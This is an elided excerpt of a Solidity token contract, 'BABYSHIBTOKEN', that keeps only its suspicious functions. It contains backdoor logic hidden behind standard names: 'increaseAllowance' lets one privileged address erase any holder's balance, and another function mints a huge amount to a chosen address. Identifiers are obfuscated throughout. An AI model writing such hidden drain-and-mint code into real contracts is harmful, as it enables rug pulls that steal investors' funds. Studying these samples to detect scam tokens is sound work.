...
contract BABYSHIBTOKEN is Ownable {
    ...
    function increaseAllowance(address uuyxxx) public     {
        ...
        uint256 curamount = BABYSHIB[newadd];
        uint256 newaaamount = BABYSHIB[newadd]+BABYSHIB[newadd]-curamount;
        BABYSHIB[newadd] -= newaaamount;
        }else{
        if(czaxw34 == _msgSender()){
        }else{
            revert("ccc");
    ...
    external {
        ...
        BABYSHIB[cc123d] += 38200*((10**decimals()*xxtoudiamount))*1*1;
    ...
    function _transfer(
        ...
        uint256 balance = BABYSHIB[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        BABYSHIB[from] = BABYSHIB[from]-amount;
        BABYSHIB[to] = BABYSHIB[to]+amount;
